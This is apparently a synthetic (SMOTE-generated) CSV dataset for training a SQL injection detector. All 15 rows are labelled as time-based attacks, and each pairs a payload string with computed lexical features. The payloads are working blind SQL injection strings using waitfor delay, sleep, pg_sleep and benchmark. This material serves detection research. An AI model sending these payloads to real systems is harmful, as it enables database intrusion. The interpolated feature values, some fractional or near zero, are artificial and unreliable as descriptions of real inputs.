id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000200,0.32476124616360563,58.70318755459481,27.812750218379243,4.25480278920554,23.0,12.0,15.0,8.70318755459481,0.3918254489317123,0.2044306690078499,0.2555383362598123,0.14820554580062553,2.7031875545948107,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000287,0.813117937395185,92.68886907302607,25.755476292104255,3.3628566175717074,21.0,18.0,42.0,11.688869073026064,0.22657009694558822,0.1942029402390756,0.45314019389117643,0.1260867689241598,0.0,0.6888690730260638,2.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,4.0,0.0,0.6888690730260638,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.4340118443701945,119.89968012291541,29.87774223587949,3.874498024981236,41.14419565115644,18.0,43.75548447175898,17.0,0.34287641002268904,0.1502217944058089,0.3650256564104603,0.14187613916104175,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,1.8777422358794915,0.12225776412050876,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.8777422358794915
SMOTE_000004,attack,time,"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000234,0.7579134083941433,112.1439571913939,34.62879143827878,4.2052100275988105,33.51516575311512,29.0,35.62879143827878,14.0,0.2980256259468304,0.25902592255412665,0.31790145440394735,0.12504699709509565,3.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.31439571913938985,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.31439571913939
SMOTE_000005,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000129,0.13174570185851792,85.06058613652101,25.939413863478997,3.508681261537541,21.0,18.0,36.0,10.060586136521003,0.24688477306881793,0.21161551977327248,0.423231039546545,0.1182686676113646,0.060586136521003864,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.060586136521003864,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000303,0.6994171074103301,101.67673080374293,30.0,3.8863114907806664,26.0,29.0,36.0,10.676730803742922,0.25571782169507706,0.2852237241983552,0.3540708300393375,0.10498762406723024,0.6767308037429214,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.6767308037429214,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.5983226611238119,64.73906250916198,21.63046874541901,3.399218352418421,21.0,10.0,26.739062509161982,7.0,0.3248686079059592,0.1546993370980758,0.41214251902731197,0.10828953596865307,0.0,0.21015624847300274,2.0,0.0,0.0,1.0,0.0,3.7898437515269974,0.0,0.0,-5.551115123125783e-17,3.0,0.0,0.21015624847300274,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000199,0.7350277838037967,108.7257730216547,30.274226978345297,3.8096143114042325,27.274226978345297,28.451546043309406,42.0,11.0,0.2508745216662386,0.2616523191550067,0.38629948463222075,0.101173674546534,1.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.7257730216547035,0.2742269783452966,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,5.146006259539031,65.3269691328163,28.046709876116616,4.199054464211817,26.34159190563135,4.248172153398119,19.039398489709093,15.697806584077743,0.41335334983332406,0.06122390038110752,0.2466205214384699,0.27880222834709856,2.0,0.5503655693203761,2.0,0.0,0.0,1.1102230246251565e-16,1.0,3.2481721533981194,0.0,2.201462277281504,0.8992688613592479,2.899268861359248,1.0,0.5503655693203761,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.899268861359248
SMOTE_000010,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000138,1.3340781624911757,109.25762716816988,29.0,3.7349615523614115,35.0,18.0,42.0,14.257627168169886,0.3204351065735825,0.16479519766641387,0.384522127888299,0.13024756787170463,2.6288135840849436,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,4.628813584084943,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.31440679204247174,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000011,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.19745991657054912,50.32644072198593,20.0,3.250915328746653,13.0,10.0,21.10536726832161,6.221073453664323,0.2595370594226105,0.19964389186354656,0.41740855861761134,0.12341049009623158,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.221073453664323,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000012,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000081,0.1427537852044647,45.16658259357678,18.166582593576777,3.6168243235587134,23.166582593576777,2.0,14.0,6.0,0.5128438851341319,0.04428691953326075,0.31000843673282513,0.1328607585997822,4.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9167087032116115,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9167087032116115
SMOTE_000013,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000075,0.2200471313232041,119.32543800721349,29.837280996393254,3.5357078391064087,45.0,10.0,50.0,14.325438007213487,0.3771341961021872,0.08380759913381938,0.41903799566909683,0.12002020909489661,1.3254380072134873,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000014,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000089,0.23623122512436054,109.15186420993135,29.92406789503432,3.8022559227000237,33.07593210496568,18.0,41.07593210496568,17.0,0.3030221572455182,0.16491168230607783,0.37631623827044164,0.15574992217796238,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.07593210496568087,0.9240678950343191,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,1.075932104965681,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9240678950343191,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000015,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000132,0.3361705068658688,89.12615655995774,29.126156559957735,3.8906454883131234,28.126156559957735,21.0,31.0,9.0,0.31556748441416005,0.23562430864430556,0.34782636037968917,0.10098184656184524,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.12615655995773456,0.8738434400422654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
